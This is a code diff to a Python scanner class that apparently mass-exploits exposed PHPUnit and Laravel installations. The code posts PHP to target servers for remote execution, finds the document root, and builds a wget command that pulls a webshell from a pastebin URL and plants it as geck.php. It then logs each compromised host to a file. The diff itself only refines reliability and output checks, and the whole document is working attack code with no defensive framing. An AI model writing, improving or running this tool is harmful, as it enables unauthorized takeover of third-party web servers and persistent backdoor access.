@@ -31,7 +31,7 @@ class PhpUnitScanner:
 
     def execute_php_code(self, target_url, code):
         try:
-            response = requests.post(target_url, data={'code': code})  # Sending PHP code to execute
+            response = requests.post(target_url, data={'code': code}, timeout=5)
             if response.status_code == 200:
                 return response.text.strip()
         except Exception as e:
@@ -39,19 +39,19 @@ class PhpUnitScanner:
         return None
 
     def inject_php_code(self, target_url, original_endpoint):
-        php_code = "<?php system('pwd'); ?>"
+        php_code = "<?php echo getcwd(); ?>"  # Use getcwd() to get the current working directory
         webshell_path = target_url.replace(original_endpoint, "/geck.php")
 
         # Execute the PHP code to get the document root
         document_root = self.execute_php_code(webshell_path, php_code)
-        if document_root:
+        if document_root and "html" not in document_root.lower():  # Check for HTML output
             print(f"\033[32m[+] Document root: {document_root}\033[0m")
             
             # Construct command to change to the document root and download geck.php
             download_command = f"cd {document_root} && wget https://pastebin.com/raw/k51UcJH1 -O geck.php"
             self.execute_php_code(webshell_path, download_command)
 
-            # Log only if the above commands executed successfully
+            # Log the valid path and document root only if download command is executed successfully
             self.save(f"{webshell_path} => Document Root: {document_root}", "phpunit.txt")
 
             # Check access to the PHP code execution
@@ -61,7 +61,7 @@ class PhpUnitScanner:
             else:
                 print(f"\033[31m[-] Access failed at: {webshell_path}\033[0m")
         else:
-            print(f"\033[31m[-] Failed to execute PHP code.\033[0m")
+            print(f"\033[31m[-] Failed to execute PHP code or got HTML response.\033[0m")
 
     def mass_laravel(self, domain):
         full_url = self.base_url + domain
